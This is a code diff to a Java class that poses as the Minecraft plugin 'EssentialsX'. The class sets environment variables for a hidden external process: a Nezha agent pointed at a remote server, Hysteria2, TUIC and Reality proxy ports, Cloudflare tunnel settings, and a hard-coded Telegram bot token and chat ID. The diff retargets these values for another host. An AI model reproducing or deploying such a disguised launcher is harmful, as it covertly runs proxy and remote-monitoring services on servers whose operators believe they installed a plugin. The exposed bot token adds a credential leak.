@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "1afd1229-b893-40c1-99cf-5107ce204913");
+        env.put("UUID", "1afd1229-b893-5555-99cf-5107ce204913");
         env.put("FILE_PATH", "./cache/java");
         env.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
         env.put("NEZHA_PORT", "");
@@ -82,17 +82,17 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "26402");
-        env.put("TUIC_PORT", "26883");
+        env.put("HY2_PORT", "25585");
+        env.put("TUIC_PORT", "25586");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
-        env.put("ANYREALITY_PORT", "26363");
+        env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5987241018");
         env.put("BOT_TOKEN", "6779283566:AAE-fSGDSik8uy8VoACv4_tLJx6D0ApVSRQ");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Godlike");
+        env.put("NAME", "Seedloaf");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
